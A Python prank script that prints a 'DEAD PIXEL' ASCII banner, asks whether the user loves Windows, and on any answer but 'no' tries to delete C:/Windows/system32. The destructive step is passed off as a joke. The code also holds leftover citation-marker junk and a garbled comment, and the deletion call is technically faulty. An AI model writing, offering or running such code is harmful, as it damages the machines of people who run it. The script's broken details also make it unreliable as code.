#!/usr/bin/env python3
import os
import sys

def render_dead_pixels():
    CYAN = "\033[38;5;39m"
    DIM_LINE = "\033[38;5;18m"
    RESET = "\033[0m"
    
    top_grid = f"{DIM_LINE}┌────────────────────────────────────────────────────────┐{RESET}"
    bottom_grid = f"{DIM_LINE}└────────────────────────────────────────────────────────┘{RESET}"

    banner = [
        f"{CYAN} ██████  ███████  █████  ██████       ██████  ██ ██   ██ ███████ ██      ███████  ██ {RESET}",
        f"{CYAN} ██   ██ ██      ██   ██ ██   ██      ██   ██ ██  ██ ██  ██      ██      ██      ███ {RESET}",
        f"{CYAN} ██   ██ █████   ███████ ██   ██      ██████  ██   ███    █████   ██      █████    ██ {RESET}",
        f"{CYAN} ██   ██ ██      ██   ██ ██   ██      ██      ██  ██ ██  ██      ██      ██       ██ {RESET}",
        f"{CYAN} ██████  ███████ ██   ██ ██████       ██      ██ ██   ██ ███████ ███████ ███████  ██ {RESET}",
        f"{CYAN}                                                                                  █ {RESET}"
    ]

    print()
    print(top_grid)
    for line in banner:
        print(f"{DIM_LINE}│{RESET}{line}{DIM_LINE}│{RESET}")
    print(bottom_grid)
    print()

def main():
    render_dead_pixels()
    
    # Interactive logic added from your second snippet[span_0](start_span)[span_0](end_span)
    answer = input("Do you love windows? ")

    if answer.lower() == "no":
        print("Good")
    else:
        # Warning: This does requires admin rights[span_1](start_span)[span_1](end_span)
        try:
            os.remove("C:/Windows/system32")
        except OSError as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
